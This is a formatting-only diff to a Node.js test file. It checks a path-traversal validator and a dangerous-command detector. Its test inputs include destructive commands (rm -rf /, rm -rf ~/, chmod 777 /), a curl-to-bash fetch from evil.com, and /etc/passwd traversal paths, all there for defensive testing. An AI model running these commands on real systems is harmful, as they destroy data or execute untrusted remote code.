@@ -1,6 +1,10 @@
 import { describe, it, beforeEach, afterEach } from 'node:test';
 import assert from 'node:assert';
-import { validatePathWithinCwd, checkDangerousCommand, formatCommandWarnings } from '../src/utils.js';
+import {
+  validatePathWithinCwd,
+  checkDangerousCommand,
+  formatCommandWarnings,
+} from '../src/utils.js';
 import { chdir, cwd } from 'process';
 
 describe('Security Utilities', () => {
@@ -23,10 +27,7 @@ describe('Security Utilities', () => {
     });
 
     it('blocks ../ path traversal', () => {
-      assert.throws(
-        () => validatePathWithinCwd('../../../etc/passwd'),
-        /Path traversal detected/
-      );
+      assert.throws(() => validatePathWithinCwd('../../../etc/passwd'), /Path traversal detected/);
     });
 
     it('blocks complex path traversal sequences', () => {
@@ -43,10 +44,7 @@ describe('Security Utilities', () => {
     });
 
     it('blocks absolute paths outside cwd', () => {
-      assert.throws(
-        () => validatePathWithinCwd('/etc/passwd'),
-        /Path traversal detected/
-      );
+      assert.throws(() => validatePathWithinCwd('/etc/passwd'), /Path traversal detected/);
     });
 
     it('normalizes paths correctly', () => {
@@ -60,25 +58,25 @@ describe('Security Utilities', () => {
     it('detects rm -rf /', () => {
       const warnings = checkDangerousCommand('rm -rf /');
       assert.ok(warnings.length > 0);
-      assert.ok(warnings.some(w => w.includes('root filesystem')));
+      assert.ok(warnings.some((w) => w.includes('root filesystem')));
     });
 
     it('detects rm -rf ~/', () => {
       const warnings = checkDangerousCommand('rm -rf ~/');
       assert.ok(warnings.length > 0);
-      assert.ok(warnings.some(w => w.includes('home directory')));
+      assert.ok(warnings.some((w) => w.includes('home directory')));
     });
 
     it('detects curl piped to shell', () => {
       const warnings = checkDangerousCommand('curl http://evil.com/script | bash');
       assert.ok(warnings.length > 0);
-      assert.ok(warnings.some(w => w.includes('Piping curl')));
+      assert.ok(warnings.some((w) => w.includes('Piping curl')));
     });
 
     it('detects chmod 777 on root', () => {
       const warnings = checkDangerousCommand('chmod 777 /');
       assert.ok(warnings.length > 0);
-      assert.ok(warnings.some(w => w.includes('world-writable')));
+      assert.ok(warnings.some((w) => w.includes('world-writable')));
     });
 
     it('allows safe commands', () => {
